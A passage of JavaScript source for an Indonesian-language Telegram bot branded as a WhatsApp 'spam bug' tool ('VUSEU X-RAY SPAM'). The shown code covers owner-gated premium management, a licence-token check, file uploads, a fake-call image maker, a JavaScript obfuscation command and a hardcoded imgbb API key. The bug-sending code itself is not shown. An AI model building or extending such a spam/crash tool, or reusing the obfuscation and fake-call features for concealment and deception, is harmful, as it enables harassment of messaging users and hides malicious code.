    )}&durasi=${encodeURIComponent(durasi)}&avatar=${encodeURIComponent(
      fileLink
    )}`;

    const res = await fetch(api);
    const buffer = await res.buffer();

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `📞 Fake Call dari *${nama}* (durasi: ${durasi})`,
      parse_mode: "Markdown",
    });
  } catch (err) {
    console.error(err);
    ctx.reply("⚠️ Gagal membuat fakecall.");
  }
});

bot.command("tourl", async (ctx) => {
  try {
    const reply = ctx.message.reply_to_message;
    if (!reply) return ctx.reply("❗ Reply media (foto/video/audio/dokumen) dengan perintah /tourl");

    let fileId;
    if (reply.photo) {
      fileId = reply.photo[reply.photo.length - 1].file_id;
    } else if (reply.video) {
      fileId = reply.video.file_id;
    } else if (reply.audio) {
      fileId = reply.audio.file_id;
    } else if (reply.document) {
      fileId = reply.document.file_id;
    } else {
      return ctx.reply("❌ Format file tidak didukung. Harap reply foto/video/audio/dokumen.");
    }

    const fileLink = await ctx.telegram.getFileLink(fileId);
    const response = await axios.get(fileLink.href, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data);

    const form = new FormData();
    form.append("reqtype", "fileupload");
    form.append("fileToUpload", buffer, {
      filename: path.basename(fileLink.href),
      contentType: "application/octet-stream",
    });

    const uploadRes = await axios.post("https://catbox.moe/user/api.php", form, {
      headers: form.getHeaders(),
    });

    const url = uploadRes.data;
    ctx.reply(`✅ File berhasil diupload:\n${url}`);
  } catch (err) {
    console.error("❌ Gagal tourl:", err.message);
    ctx.reply("❌ Gagal mengupload file ke URL.");
  }
});

const IMGBB_API_KEY = "76919ab4062bedf067c9cab0351cf632";

bot.command("tourl2", async (ctx) => {
  try {
    const reply = ctx.message.reply_to_message;
    if (!reply) return ctx.reply("❗ Reply foto dengan /tourl2");

    let fileId;
    if (reply.photo) {
      fileId = reply.photo[reply.photo.length - 1].file_id;
    } else {
      return ctx.reply("❌ i.ibb hanya mendukung foto/gambar.");
    }

    const fileLink = await ctx.telegram.getFileLink(fileId);
    const response = await axios.get(fileLink.href, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data);

    const form = new FormData();
    form.append("image", buffer.toString("base64"));

    const uploadRes = await axios.post(
      `https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`,
      form,
      { headers: form.getHeaders() }
    );

    const url = uploadRes.data.data.url;
    ctx.reply(`✅ Foto berhasil diupload:\n${url}`);
  } catch (err) {
    console.error("❌ tourl2 error:", err.message);
    ctx.reply("❌ Gagal mengupload foto ke i.ibb.co");
  }
});

bot.command("zenc", async (ctx) => {
  
  if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.document) {
    return ctx.replyWithMarkdown("❌ Harus reply ke file .js");
  }

  const file = ctx.message.reply_to_message.document;
  if (!file.file_name.endsWith(".js")) {
    return ctx.replyWithMarkdown("❌ File harus berekstensi .js");
  }

  const encryptedPath = path.join(
    __dirname,
    `invisible-encrypted-${file.file_name}`
  );

  try {
    const progressMessage = await ctx.replyWithMarkdown(
      "```css\n" +
        "🔒 EncryptBot\n" +
        ` ⚙️ Memulai (Invisible) (1%)\n` +
        ` ${createProgressBar(1)}\n` +
        "```\n"
    );

    const fileLink = await ctx.telegram.getFileLink(file.file_id);
    log(`Mengunduh file: ${file.file_name}`);
    await updateProgress(ctx, progressMessage, 10, "Mengunduh");
    const response = await fetch(fileLink);
    let fileContent = await response.text();
    await updateProgress(ctx, progressMessage, 20, "Mengunduh Selesai");

    log(`Memvalidasi kode awal: ${file.file_name}`);
    await updateProgress(ctx, progressMessage, 30, "Memvalidasi Kode");
    try {
      new Function(fileContent);
    } catch (syntaxError) {
      throw new Error(`Kode tidak valid: ${syntaxError.message}`);
    }

    log(`Proses obfuscation: ${file.file_name}`);
    await updateProgress(ctx, progressMessage, 40, "Inisialisasi Obfuscation");
    const obfuscated = await JsConfuser.obfuscate(
      fileContent,
      getStrongObfuscationConfig()
    );

    let obfuscatedCode = obfuscated.code || obfuscated;
    if (typeof obfuscatedCode !== "string") {
      throw new Error("Hasil obfuscation bukan string");
    }

    log(`Preview hasil (50 char): ${obfuscatedCode.substring(0, 50)}...`);
    await updateProgress(ctx, progressMessage, 60, "Transformasi Kode");

    log(`Validasi hasil obfuscation`);
    try {
      new Function(obfuscatedCode);
    } catch (postObfuscationError) {
      throw new Error(
        `Hasil obfuscation tidak valid: ${postObfuscationError.message}`
      );
    }

    await updateProgress(ctx, progressMessage, 80, "Finalisasi Enkripsi");
    await fs.writeFile(encryptedPath, obfuscatedCode);

    log(`Mengirim file terenkripsi: ${file.file_name}`);
    await ctx.replyWithDocument(
      { source: encryptedPath, filename: `Invisible-encrypted-${file.file_name}` },
      {
        caption:
          "✅ *ENCRYPT BERHASIL!*\n\n" +
          "📂 File: `" +
          file.file_name +
          "`\n" +
          "🔒 Mode: *Invisible Strong Obfuscation*",
        parse_mode: "Markdown",
      }
    );

    await ctx.deleteMessage(progressMessage.message_id);

    if (await fs.pathExists(encryptedPath)) {
      await fs.unlink(encryptedPath);
      log(`File sementara dihapus: ${encryptedPath}`);
    }
  } catch (error) {
    log("Kesalahan saat zenc", error);
    await ctx.replyWithMarkdown(
      `❌ *Kesalahan:* ${error.message || "Tidak diketahui"}\n` +
        "_Coba lagi dengan kode Javascript yang valid!_"
    );
    if (await fs.pathExists(encryptedPath)) {
      await fs.unlink(encryptedPath);
      log(`File sementara dihapus setelah error: ${encryptedPath}`);
    }
  }
});

function buildAnalyzer(code, results = [], replied = null, args = []) {
  const lines = code.split("\n");
  const flags = [];

  if (/async/.test(code)) flags.push("async");
  if (/await/.test(code)) flags.push("await");
  if (/require\s*\(/.test(code)) flags.push("require()");
  if (/import\s+/.test(code)) flags.push("import");
  if (/axios/i.test(code)) flags.push("axios");
  if (/telegraf/i.test(code)) flags.push("telegraf");
  if (/\bfs\b/.test(code)) flags.push("fs");

  const mode = /require\s*\(/.test(code)
    ? "CJS"
    : /import\s+/.test(code)
    ? "ESM"
    : "Unknown";

  let syntax = {
    valid: true,
    error: null,
    line: null,
    column: null,
    snippet: ""
  };

  try {
    new vm.Script(code);
  } catch (err) {
    syntax.valid = false;
    syntax.error = err.message;

    const match = err.stack?.match(/:(\d+):(\d+)/);

    if (match) {
      syntax.line = Number(match[1]);
      syntax.column = Number(match[2]);

      const start = Math.max(0, syntax.line - 3);
      const end = Math.min(lines.length, syntax.line + 2);

      for (let i = start; i < end; i++) {
        const pointer = i + 1 === syntax.line ? "👉" : "  ";
        syntax.snippet += `${pointer} ${String(i + 1).padStart(4)} | ${lines[i]}\n`;
      }
    }
  }

  const stats = {};
  results.forEach(x => {
    stats[x.type] = (stats[x.type] || 0) + 1;
  });

  const now = new Date();

  let output = `🧪 Function Analyzer

🕒 ${now.toLocaleTimeString("id-ID")}
📅 ${now.toLocaleDateString("id-ID")}

━━━━━━━━━━━━━━━━━━━━
📄 File   : ${
    replied?.document?.file_name ||
    args?.[0] ||
    "Source"
  }
📦 Ukuran : ${(Buffer.byteLength(code) / 1024).toFixed(1)} KB
📑 Baris  : ${lines.length}
🔡 Chars  : ${code.length}
🧩 Mode   : ${mode}
⚙️ Flags  : ${flags.length ? flags.join(", ") : "-"}
━━━━━━━━━━━━━━━━━━━━

🧠 Function Terdeteksi (${results.length})

`;

  if (results.length) {
    for (const item of results) {
      output += `• ${item.name}\n  └ ${item.type} | Line ${item.line}\n\n`;
    }
  } else {
    output += "📭 Tidak ditemukan function atau class.\n\n";
  }

  output += "━━━━━━━━━━━━━━━━━━━━\n📊 Statistik\n\n";

  for (const [type, total] of Object.entries(stats)) {
    output += `• ${type}: ${total}\n`;
  }

  output += `\nTotal: ${results.length}\n`;

  if (syntax.valid) {
    output += `\n━━━━━━━━━━━━━━━━━━━━\n\n✅ Syntax Valid\n`;
  } else {
    output += `
━━━━━━━━━━━━━━━━━━━━

❌ Syntax Error

📍 Line   : ${syntax.line ?? "?"}
📍 Column : ${syntax.column ?? "?"}

${syntax.error}

📌 Cuplikan

${syntax.snippet || "Tidak tersedia"}
`;
  }

  return output;
}

// ================= COMMAND /cekfunct =================
bot.command("cekfunct", async (ctx) => {
  try {
    const msg = ctx.message;
    const args = msg.text.split(" ").slice(1);

    let code = "";

    // dari reply file
    if (msg.reply_to_message?.document) {
      const fileLink = await ctx.telegram.getFileLink(
        msg.reply_to_message.document.file_id
      );

      const res = await fetch(fileLink.href);
      code = await res.text();
    }
    // dari text input
    else {
      code = args.join(" ");
    }

    if (!code || code.trim().length === 0) {
      return ctx.reply("Kasih code atau reply file. Jangan kosong, ini bot bukan cenayang.");
    }

    const output = buildAnalyzer(code, [], msg.reply_to_message, args);

    return ctx.reply(output);
  } catch (err) {
    return ctx.reply(`Error: ${err.message}`);
  }
});

bot.command("cekerror", async (ctx) => {
  try {
    const replied = ctx.message.reply_to_message;

    if (!replied?.document) {
      return ctx.reply("📁 Reply ke file JavaScript (.js)");
    }

    const file = replied.document;

    if (!file.file_name?.toLowerCase().endsWith(".js")) {
      return ctx.reply("⚠️ File harus berformat .js");
    }

    const loading = await ctx.reply("⏳ Analyzing source...");

    const fileLink = await ctx.telegram.getFileLink(file.file_id);
    const res = await fetch(fileLink.href);

    if (!res.ok) {
      return ctx.reply("❌ Gagal download file");
    }

    const code = await res.text();
    const lines = code.split("\n");

    // ================= FUNCTION DETECTION =================
    const functions = [];
    const regexes = [
      /function\s+([a-zA-Z_$][\w$]*)\s*\(/g,
      /async\s+function\s+([a-zA-Z_$][\w$]*)\s*\(/g,
      /(?:const|let|var)\s+([a-zA-Z_$][\w$]*)\s*=\s*(?:async\s*)?\([^)]*\)\s*=>/g,
      /(?:const|let|var)\s+([a-zA-Z_$][\w$]*)\s*=\s*(?:async\s*)?function\s*\(/g,
      /class\s+([a-zA-Z_$][\w$]*)/g
    ];

    for (const regex of regexes) {
      let match;
      while ((match = regex.exec(code)) !== null) {
        if (!functions.includes(match[1])) {
          functions.push(match[1]);
        }
      }
    }

    // ================= FLAGS =================
    const flags = [
      /async/.test(code) && "async",
      /await/.test(code) && "await",
      /require\s*\(/.test(code) && "require()",
      /import\s+/.test(code) && "import",
      /axios/i.test(code) && "axios",
      /telegraf/i.test(code) && "telegraf",
      /\bfs\b/.test(code) && "fs"
    ].filter(Boolean);

    const mode = /require\s*\(/.test(code)
      ? "CJS"
      : /import\s+/.test(code)
      ? "ESM"
      : "Unknown";

    const now = new Date();

    let report = `🧪 CekError Analyzer

🕒 ${now.toLocaleTimeString("id-ID")}
📅 ${now.toLocaleDateString("id-ID")}

━━━━━━━━━━━━━━━━━━━━
📄 File   : ${file.file_name}
📦 Ukuran : ${(Buffer.byteLength(code, "utf8") / 1024).toFixed(1)} KB
📑 Baris  : ${lines.length}
🔡 Chars  : ${code.length}
🧩 Mode   : ${mode}
⚙️ Flags  : ${flags.join(", ") || "-"}
━━━━━━━━━━━━━━━━━━━━

🧠 Functions (${functions.length})
${functions.length ? functions.map(f => `• ${f}`).join("\n") : "Tidak ditemukan"}
`;

    // ================= SYNTAX CHECK =================
    let syntaxError = null;

    try {
      new vm.Script(code);
    } catch (err) {
      syntaxError = err;
    }

    if (!syntaxError) {
      report += `

━━━━━━━━━━━━━━━━━━━━

✅ Syntax Valid
`;
    } else {
      const match = syntaxError.stack?.match(/:(\d+):(\d+)/);

      const lineNum = match ? Number(match[1]) : null;
      const colNum = match ? match[2] : "?";

      let snippet = "";

      if (lineNum) {
        const start = Math.max(0, lineNum - 3);
        const end = Math.min(lines.length, lineNum + 2);

        for (let i = start; i < end; i++) {
          snippet += `${i + 1 === lineNum ? "👉" : "  "} ${String(i + 1).padStart(4)} | ${lines[i]}\n`;
        }
      }

      report += `

━━━━━━━━━━━━━━━━━━━━

❌ Syntax Error

📍 Line   : ${lineNum || "?"}
📍 Column : ${colNum}

${syntaxError.message}

📌 Cuplikan

${snippet || "Tidak tersedia"}
`;
    }

    try {
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        loading.message_id,
        undefined,
        report
      );
    } catch (e) {
      await ctx.reply(report);
    }

  } catch (err) {
    console.error(err);
    return ctx.reply(`❌ Error\n\n${err.message}`);
  }
});

bot.command("setcd", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcd 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("killsesi", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});



const PREM_GROUP_FILE = "./grup.json";

// Auto create file grup.json kalau belum ada
function ensurePremGroupFile() {
  if (!fs.existsSync(PREM_GROUP_FILE)) {
    fs.writeFileSync(PREM_GROUP_FILE, JSON.stringify([], null, 2));
  }
}

function loadPremGroups() {
  ensurePremGroupFile();
  try {
    const raw = fs.readFileSync(PREM_GROUP_FILE, "utf8");
    const data = JSON.parse(raw);
    return Array.isArray(data) ? data.map(String) : [];
  } catch {
    // kalau corrupt, reset biar aman
    fs.writeFileSync(PREM_GROUP_FILE, JSON.stringify([], null, 2));
    return [];
  }
}

function savePremGroups(groups) {
  ensurePremGroupFile();
  const unique = [...new Set(groups.map(String))];
  fs.writeFileSync(PREM_GROUP_FILE, JSON.stringify(unique, null, 2));
}

function isPremGroup(chatId) {
  const groups = loadPremGroups();
  return groups.includes(String(chatId));
}

function addPremGroup(chatId) {
  const groups = loadPremGroups();
  const id = String(chatId);
  if (groups.includes(id)) return false;
  groups.push(id);
  savePremGroups(groups);
  return true;
}

function delPremGroup(chatId) {
  const groups = loadPremGroups();
  const id = String(chatId);
  if (!groups.includes(id)) return false;
  const next = groups.filter((x) => x !== id);
  savePremGroups(next);
  return true;
}

bot.command("addpremgrup", async (ctx) => {
  if (ctx.from.id != ownerID) return ctx.reply("❌ ☇ Akses hanya untuk pemilik");

  const args = (ctx.message?.text || "").trim().split(/\s+/);

 
  let groupId = String(ctx.chat.id);

  if (ctx.chat.type === "private") {
    if (args.length < 2) {
      return ctx.reply("🪧 ☇ Format: /addpremgrup -1001234567890\nKirim di private wajib pakai ID grup.");
    }
    groupId = String(args[1]);
  } else {
 
    if (args.length >= 2) groupId = String(args[1]);
  }

  const ok = addPremGroup(groupId);
  if (!ok) return ctx.reply(`🪧 ☇ Grup ${groupId} sudah terdaftar sebagai grup premium.`);
  return ctx.reply(`✅ ☇ Grup ${groupId} berhasil ditambahkan ke daftar grup premium.`);
});

bot.command("delpremgrup", async (ctx) => {
  if (ctx.from.id != ownerID) return ctx.reply("❌ ☇ Akses hanya untuk pemilik");

  const args = (ctx.message?.text || "").trim().split(/\s+/);

  let groupId = String(ctx.chat.id);

  if (ctx.chat.type === "private") {
    if (args.length < 2) {
      return ctx.reply("🪧 ☇ Format: /delpremgrup -1001234567890\nKirim di private wajib pakai ID grup.");
    }
    groupId = String(args[1]);
  } else {
    if (args.length >= 2) groupId = String(args[1]);
  }

  const ok = delPremGroup(groupId);
  if (!ok) return ctx.reply(`🪧 ☇ Grup ${groupId} belum terdaftar sebagai grup premium.`);
  return ctx.reply(`✅ ☇ Grup ${groupId} berhasil dihapus dari daftar grup premium.`);
});

bot.command('addprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    let userId;
    const args = ctx.message.text.split(" ");
    
    // Cek apakah menggunakan reply
    if (ctx.message.reply_to_message) {
        // Ambil ID dari user yang direply
        userId = ctx.message.reply_to_message.from.id.toString();
    } else if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addprem 12345678 30d\nAtau reply pesan user yang ingin ditambahkan");
    } else {
        userId = args[1];
    }
    
    // Ambil durasi
    const durationIndex = ctx.message.reply_to_message ? 1 : 2;
    const duration = parseInt(args[durationIndex]);
    
    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }
    
    const expiryDate = addpremUser(userId, duration);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
});

// VERSI MODIFIKASI UNTUK DELPREM (dengan reply juga)
bot.command('delprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    let userId;
    const args = ctx.message.text.split(" ");
    
    // Cek apakah menggunakan reply
    if (ctx.message.reply_to_message) {
        // Ambil ID dari user yang direply
        userId = ctx.message.reply_to_message.from.id.toString();
    } else if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delprem 12345678\nAtau reply pesan user yang ingin dihapus");
    } else {
        userId = args[1];
    }
    
    removePremiumUser(userId);
    ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});

const pendingVerification = new Set();
// ================
// 🔐 VERIFIKASI TOKEN
// ================
bot.use(async (ctx, next) => {
  if (secureMode) return next();
  if (tokenValidated) return next();

  const chatId = (ctx.chat && ctx.chat.id) || (ctx.from && ctx.from.id);
  if (!chatId) return next();
  if (pendingVerification.has(chatId)) return next();
  pendingVerification.add(chatId);

  const sleep = (ms) => new Promise((res) => setTimeout(res, ms));
  const frames = [
    "▰▱▱▱▱▱▱▱▱▱ 10%",
    "▰▰▱▱▱▱▱▱▱▱ 20%",
    "▰▰▰▱▱▱▱▱▱▱ 30%",
    "▰▰▰▰▱▱▱▱▱▱ 40%",
    "▰▰▰▰▰▱▱▱▱▱ 50%",
    "▰▰▰▰▰▰▱▱▱▱ 60%",
    "▰▰▰▰▰▰▰▱▱▱ 70%",
    "▰▰▰▰▰▰▰▰▱▱ 80%",
    "▰▰▰▰▰▰▰▰▰▱ 90%",
    "▰▰▰▰▰▰▰▰▰▰ 100%"
  ];

  let loadingMsg = null;

  try {
    loadingMsg = await ctx.reply("⏳ *BOT SEDANG MEMVERIFIKASI TOKEN...*", {
      parse_mode: "Markdown"
    });

    for (const frame of frames) {
      if (tokenValidated) break;
      await sleep(180);
      try {
        await ctx.telegram.editMessageText(
          loadingMsg.chat.id,
          loadingMsg.message_id,
          null,
          `🔐 *Verifikasi Token Server...*\n${frame}`,
          { parse_mode: "Markdown" }
        );
      } catch { /* skip */ }
    }

    if (!databaseUrl || !tokenBot) {
      await ctx.telegram.editMessageText(
        loadingMsg.chat.id,
        loadingMsg.message_id,
        null,
        "⚠️ *Konfigurasi server tidak lengkap.*\nPeriksa `databaseUrl` atau `tokenBot`.",
        { parse_mode: "Markdown" }
      );
      pendingVerification.delete(chatId);
      return;
    }

    // Fungsi ambil data token pakai HTTPS native
    const getTokenData = () => new Promise((resolve, reject) => {
      https.get(databaseUrl, { timeout: 6000 }, (res) => {
        let data = "";
        res.on("data", (chunk) => (data += chunk));
        res.on("end", () => {
          try {
            const json = JSON.parse(data);
            resolve(json);
          } catch {
            reject(new Error("Invalid JSON response"));
          }
        });
      }).on("error", (err) => reject(err));
    });

    let result;
    try {
      result = await getTokenData();
    } catch (err) {
      await ctx.telegram.editMessageText(
        loadingMsg.chat.id,
        loadingMsg.message_id,
        null,
        "⚠️ *Gagal mengambil daftar token dari server.*\nSilakan coba lagi nanti.",
        { parse_mode: "Markdown" }
      );
      pendingVerification.delete(chatId);
      return;
    }

    const tokens = (result && Array.isArray(result.tokens)) ? result.tokens : [];
    if (tokens.length === 0) {
      await ctx.telegram.editMessageText(
        loadingMsg.chat.id,
        loadingMsg.message_id,
        null,
        "⚠️ *Token tidak tersedia di database.*\nHubungi admin untuk memperbarui data.",
        { parse_mode: "Markdown" }
      );
      pendingVerification.delete(chatId);
      return;
    }

    // Validasi token
    if (tokens.includes(tokenBot)) {
      tokenValidated = true;
      await ctx.telegram.editMessageText(
        loadingMsg.chat.id,
        loadingMsg.message_id,
        null,
        "✅ *Token diverifikasi server!*\nMembuka menu utama...",
        { parse_mode: "Markdown" }
      );
      await sleep(1000);
      pendingVerification.delete(chatId);
      return next();
    } else {
      const keyboardBypass = {
        inline_keyboard: [
          [{ text: "Buy Script", url: "https://t.me/LoxNex" }]
        ]
      };

      await ctx.telegram.editMessageText(
        loadingMsg.chat.id,
        loadingMsg.message_id,
        null,
        "*Bypass Detected!*\nToken tidak sah atau tidak terdaftar.\nYour access has been restricted.",
        { parse_mode: "Markdown" }
      );

      await sleep(500);
      await ctx.replyWithPhoto("https://files.catbox.moe/gtnxmm.jpg", {
        caption:
          "🚫 *Access Denied*\nSistem mendeteksi token tidak valid.\nGunakan versi original dari owner.",
        parse_mode: "Markdown",
        reply_markup: keyboardBypass
      });

      pendingVerification.delete(chatId);
      return;
    }

  } catch (err) {
    console.error("Verification Error:", err);
    if (loadingMsg) {
      await ctx.telegram.editMessageText(
        loadingMsg.chat.id,
        loadingMsg.message_id,
        null,
        "⚠️ *Terjadi kesalahan saat memverifikasi token.*",
        { parse_mode: "Markdown" }
      );
    } else {
      await ctx.reply("⚠️ *Terjadi kesalahan saat memverifikasi token.*", {
        parse_mode: "Markdown"
      });
    }
  } finally {
    pendingVerification.delete(chatId);
  }
});

// =========================
// COMMAND START
// =========================
bot.start(async (ctx) => {
const joined = await checkJoin(ctx.from.id);

if (!joined) {
  return ctx.replyWithPhoto(thumbnailUrl, {
    caption: `
<blockquote>𝚅𝚄𝚂𝙴𝚄 𝚇-𝚁𝙰𝚈 𝚂𝙿𝙰𝙼</blockquote>

≡ Detect @${ctx.from.username || ctx.from.first_name}!
Kamu harus Join Channel terlebih dahulu untuk menggunakan bot ini.

≡ Channel : ${CHANNEL_USERNAME}
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: "⇆ Join Channel",
            url: `https://t.me/${CHANNEL_USERNAME.replace("@", "")}`, style: "Primary", icon_custom_emoji_id: "5893203503915996356"
          }
        ],
        [
          {
            text: "⇆ Sudah Join",
            callback_data: "verify_join", style: "Success", icon_custom_emoji_id: "5893494861612455015"
          }
        ]
      ]
    }
  });
}
  if (!tokenValidated)
    return ctx.reply("❌ *Token belum diverifikasi server.* Tunggu proses selesai.", { parse_mode: "Markdown" });
  
  const userId = ctx.from.id;
  const isOwner = userId == ownerID;
  const premiumStatus = isPremiumUser(ctx.from.id) ? "✅ Premium" : "❌ No Premium";
  const senderStatus = isWhatsAppConnected ? "✅ Terhubung" : "❌ Tidak Terhubung";
  const runtimeStatus = formatRuntime();
  const memoryStatus = formatMemory();

  // ============================
  // 🔓 OWNER BYPASS FULL
  // ============================
  if (!isOwner) {
    // Jika user buka di private → blokir
    if (ctx.chat.type === "private") {
      // Kirim notifikasi ke owner
      bot.telegram.sendMessage(
        ownerID,
        `📩 *NOTIFIKASI START PRIVATE*\n\n` +
        `👤 User: ${ctx.from.first_name || ctx.from.username}\n` +
        `🆔 ID: <code>${ctx.from.id}</code>\n` +
        `🔗 Username: @${ctx.from.username || "-"}\n` +
        `💬 Akses private diblokir.\n\n` +
        `⌚ Waktu: ${new Date().toLocaleString("id-ID")}`,
        { parse_mode: "HTML" }
      );
      return ctx.reply("❌ Bot ini hanya bisa digunakan di grup yang memiliki akses.");
    }
  }
  
 
if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
  return ctx.reply("❌ ☇ Grup ini belum terdaftar sebagai GRUP PREMIUM.");
}

  const menuMessage = `
<blockquote><strong>𝚅𝚄𝚂𝙴𝚄 𝚇-𝚁𝙰𝚈 𝚂𝙿𝙰𝙼</strong></blockquote>
↯ Developer : @LoxNex<tg-emoji emoji-id="5778220576497735613">⚜️</tg-emoji>
↯ Version : 15.0 Murbug
↯ Prefix : /
↯ Type : Bebas Spam Bug
↯ Fitur : Auto Update
<blockquote><strong>𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽</strong></blockquote>
↯ Status : ${premiumStatus}  
↯ Username  : @${ctx.from.username || "Tidak Ada"}
↯ ID   : <code>${userId}</code>
↯ Runtime : ${runtimeStatus}
<blockquote><strong>𝚂𝙴𝙽𝙳𝙴𝚁 𝚂𝚃𝙰𝚃𝚄𝚂</strong></blockquote>
↯ Koneksi: ${senderStatus}`;

  const keyboard = [
        [
            { text: "XBUGS", callback_data: "/bug", style: "Primary", icon_custom_emoji_id: "6041705726206808304" }, 
            { text: "XSETTINGS", callback_data: "/controls", style: "Danger", icon_custom_emoji_id: "5893203503915996356" }
        ],
        [
            { text: "DEVELOPER", url: "https://t.me/LoxNex", style: "Success", icon_custom_emoji_id: "5893494861612455015" }
        ]
    ];

    ctx.replyWithPhoto(thumbnailUrl, {
        caption: menuMessage,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: keyboard
        }
    });
});

// ======================
// CALLBACK UNTUK MENU UTAMA
// ======================
bot.action("/start", async (ctx) => {
  if (!tokenValidated)
    return ctx.answerCbQuery("🔑 Token belum diverifikasi server.");

  const userId = ctx.from.id;
  const premiumStatus = isPremiumUser(ctx.from.id) ? "✅ Premium" : "❌ No Premium";
  const senderStatus = isWhatsAppConnected ? "✅ Terhubung" : "❌ Tidak Terhubung";
  const runtimeStatus = formatRuntime();

  const menuMessage = `
<blockquote><strong>𝚅𝚄𝚂𝙴𝚄 𝚇-𝚁𝙰𝚈 𝚂𝙿𝙰𝙼</strong></blockquote>
↯ Developer : @LoxNex<tg-emoji emoji-id="5778220576497735613">⚜️</tg-emoji>
↯ Version : 15.0 Murbug
↯ Prefix : /
↯ Type : Bebas Spam Bug
↯ Fitur : Auto Update
<blockquote><strong>𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽</strong></blockquote>
↯ Status : ${premiumStatus}  
↯ Username  : @${ctx.from.username || "Tidak Ada"}
↯ ID   : <code>${userId}</code>
↯ Runtime : ${runtimeStatus}
<blockquote><strong>𝚂𝙴𝙽𝙳𝙴𝚁 𝚂𝚃𝙰𝚃𝚄𝚂</strong></blockquote>
↯ Koneksi: ${senderStatus}`;

  const keyboard = [
        [
            { text: "XBUGS", callback_data: "/bug", style: "Primary", icon_custom_emoji_id: "6041705726206808304" }, 
            { text: "XSETTINGS", callback_data: "/controls", style: "Danger", icon_custom_emoji_id: "5893203503915996356" }
        ],
        [
            { text: "DEVELOPER", url: "https://t.me/LoxNex", style: "Success", icon_custom_emoji_id: "5893494861612455015" }
        ]
    ];

    try {
        await ctx.editMessageMedia({
            type: 'photo',
            media: thumbnailUrl,
            caption: menuMessage,
            parse_mode: "HTML",
        }, {
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();

    } catch (error) {
        if (
            error.response &&
            error.response.error_code === 400 &&
            error.response.description.includes("メッセージは変更されませんでした")
        ) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error saat mengirim menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.action('/controls', async (ctx) => {
    const controlsMenu = `
<blockquote><strong>𝚅𝚄𝚂𝙴𝚄 𝚇-𝚁𝙰𝚈 𝚂𝙿𝙰𝙼</strong></blockquote>
↯ Developer : @LoxNex<tg-emoji emoji-id="5778220576497735613">⚜️</tg-emoji>
↯ Version : 15.0 Murbug
↯ Prefix : /
↯ Type : Bebas Spam Bug
↯ Fitur : Auto Update
<blockquote><strong>𝚂𝙴𝚃𝚃𝙸𝙽𝙶𝚂 𝙼𝙴𝙽𝚄</strong></blockquote>
↯ /blockcmd - Blokir Command
↯ /unblockcmd - Buka Blokir Command
↯ /listblockcmd - List Semua Cmd Di Block
<blockquote><strong>𝙲𝙾𝙽𝚃𝚁𝙾𝙻 𝚂𝙴𝙽𝙳𝙴𝚁</strong></blockquote>
↯ /addbot - Add Sender 
↯ /killsesi - Reset Session
<blockquote><strong>𝙲𝙾𝙾𝙻𝙳𝙾𝚆𝙽 𝚂𝙴𝚃𝚃𝙸𝙽𝙶𝚂</strong></blockquote>
↯ /setcd - Set Cooldown
<blockquote><strong>𝚂𝙴𝚃𝚃𝙸𝙽𝙶𝚂 𝙰𝙳𝙼𝙸𝙽</strong></blockquote>
↯ /addadmin - Add Admin
↯ /deladmin - Delete Admin
↯ /addprem - Add Premium 
↯ /delprem - Delete Premium
<blockquote><strong>𝙶𝚁𝙾𝚄𝙿 𝚂𝙴𝚃𝚃𝙸𝙽𝙶𝚂</strong></blockquote>
↯ /addpremgrup - Add Premium Group
↯ /delpremgrup - Delete Premium Group
<blockquote><strong>𝚃𝙾𝙾𝙻𝚂 𝙼𝙴𝙽𝚄</strong></blockquote>
↯ /cekerror - cek error js
↯ /tiktok - Tiktok Downloader
↯ /tourl - To Url Image/Video
↯ /tourl2 - To Url Image
↯ /zenc - Encripsi File Js
↯ /fakecall - Telepon Fake
<blockquote><pre>⬡═―—⊱ Click Button Menu ⊰―—═⬡</pre></blockquote>`;

    const keyboard = [
        [
            { text: "BACK", callback_data: "/start", style: "Primary", icon_custom_emoji_id: "5893203503915996356" },
            { text: "CHANNEL", url: "https://t.me/AboutKingZurrx", style: "Success", icon_custom_emoji_id: "5893494861612455015" }
        ]
    ];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "HTML",
